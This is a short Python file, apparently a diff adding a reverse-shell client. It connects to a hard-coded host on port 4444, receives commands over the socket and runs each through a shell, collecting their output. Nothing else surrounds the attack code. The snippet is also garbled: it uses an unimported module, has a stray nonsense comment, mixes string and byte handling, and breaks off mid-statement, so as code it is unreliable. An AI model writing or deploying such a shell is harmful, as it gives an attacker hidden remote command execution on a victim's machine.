import socket, subprocess, os
+# rhino isamm(sock, 1);
+
+LHOST = "192.168.43.2"
+LPORT = 4444
+
+def main():
+
+    try:
+        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+        s.connect((LHOST, LPORT))
+        s.send("[+] Connection established.\n")
+
+        print("Preparing payload....")
+
+        while True:
+            data = s.recv(1024)
+            if data == "quit": break
+
+            proc = subprocess.Popen(data, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE)
+            stdout_value = proc.stdout.read() + proc.stderr.read()
+            args = shlex.split(data)
+            print("[+] Command executed:\n" + ' '.
